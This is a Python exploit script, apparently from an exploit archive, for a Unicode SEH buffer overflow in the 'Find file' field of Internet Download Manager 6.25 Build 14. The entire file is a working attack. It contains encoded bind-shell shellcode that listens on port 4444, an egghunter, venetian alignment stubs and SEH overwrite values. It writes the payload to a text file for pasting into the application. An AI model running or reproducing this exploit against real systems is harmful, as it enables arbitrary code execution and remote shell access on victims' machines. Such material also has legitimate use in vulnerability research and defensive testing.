#!/usr/bin/python

# Exploit Title: Internet Download Manager 6.25 Build 14 - 'Find file' SEH Buffer Overflow (Unicode)
# Date: 20-3-2016
# Exploit Author: Rakan Alotaibi
# Contact: https://twitter.com/hxteam
# Software Link: http://mirror2.internetdownloadmanager.com/idman625build14.exe
# Tested on: Windows 7 SP1 x86
# How to exploit: IDM > Downloads > Find > paste exploit string into 'Find file' textbox

tag = "AvAv"

# msfvenom -p windows/shell_bind_tcp lport=4444 -e x86/unicode_upper BufferRegister=EAX
shellcode = (
"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ"
"11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944J"
"BKL9XU2M0KPM0QP3YZENQ7PQTTKR0NPDKR2LLDKQBN44KSBMXLO7GOZO601KO6LO"
"LS1SLM2NLMP7Q8OLMKQY7IRZR1BQG4K22N04K0JOLDK0LN1SHJC0HM18Q0Q4K0YO"
"0KQ9CTKOYLX9SNZQ94KNTDKKQ8V01KOVLGQ8OLMKQY708K0D5KFLC3MKHOKCMNDD"
"5ZD0X4KB8O4M1IC2F4KLL0KTKPXMLKQICDKKTDKKQJ0SY0DO4NDQK1KS1QIPZ21K"
"OK01O1O1JDKMBZKTM1M2HP3OBKPKP1XT7SCNR1OB42H0LCGO6LGKOIEH860M1M0K"
"PMYXD1DPPQXMY3PBKKPKOHU2JKXR9R0IRKMQ0R0Q00PQXJJLO9OIPKOIE4WQXM2K"
"PN11L4IYVQZLPQFPWS8XBIKNW1WKOHU0WRHWG9YOHKOKO8U27BHD4ZLOKYQKOYE0"
"W671X2UBNPMS1KOYEBH2C2MRDM0TIIS27QG0WP1ZVBJLR29PVK2KM3697PDNDOLK"
"QM1TM14NDLPWVKP14QD0PQF26PVOV26PNQFR6QC26QXBYXLOO3VKO9E3YK00NB6O"
"VKOP0QXKX57MMC0KOZ5WKL0FUFBB6QX5V5E7MEMKOXUOLKV3LKZ3PKKIP45M57KP"
"GMCCB2OBJKPQCKO9EAA")

# Windows NtAccessCheckAndAuditAlarm EggHunter
# Size: 32 bytes
egghunter = (
"PPYAIAIAIAIAQATA"
"XAZAPA3QADAZABAR"
"ALAYAIAQAIAQAPA5"
"AAAPAZ1AI1AIAIAJ"
"11AIAIAXA58AAPAZ"
"ABABQI1AIQIAIQI1"
"111AIAJQI1AYAZBA"
"BABABAB30APB944J"
"BQV51HJKOLOPBR2Q"
"ZKRPXXMNNOLKUPZ2"
"TJOWHKPOQKPT6DKJ"
"ZVOT5ZJVOBUK7KOK"
"7LJA")

buffersize = 6000
nseh = "\x61\x47" # popad + venetian pad
seh =  "\x8d\x51" # 0x0051008d: pop edi # pop esi # ret [IDMan.exe]
venalign = (
            "\x47" # venetian pad
            "\x55" # push ebp
            "\x47" # venetian pad
            "\x58" # pop eax
            "\x47" # venetian pad
            "\x05\x18\x11" # add eax,11001800
            "\x47" # venetian pad
            "\x2d\x17\x11" # sub eax,11001700
            "\x47" # venetian pad
            "\x50" # push eax
            "\x47" # venetian pad
            "\xc3" # ret
            )
            
venalign2 = (
            "\x43" # venetian pad
            "\x47" # inc edi
            "\x43" # venetian pad
            "\x57" # push edi
            "\x43" # venetian pad
            "\x58" # pop eax
            "\x43" # venetian pad
            "\x05\x18\x11" # add eax,11001800
            "\x43" # venetian pad
            "\x2d\x17\x11" # sub eax,11001700
            "\x43" # venetian pad
            "\x50" # push eax
            "\x43" # venetian pad
            "\xc3" # ret
            )

junk2 = "\x71" * 108
junk3 = "\x71" * 110
evil2 = tag +  venalign2 + junk3 + shellcode
junk = "\x42" * (2192-(len(evil2)))
evil =  junk + evil2 + nseh + seh + venalign + junk2 + egghunter
fill = "\x47" * (buffersize-len(evil))
buffer = evil + fill

filename = "exploit.txt"
file = open(filename, 'w')
file.write(buffer)
file.close()
print buffer
print "[+] File created successfully"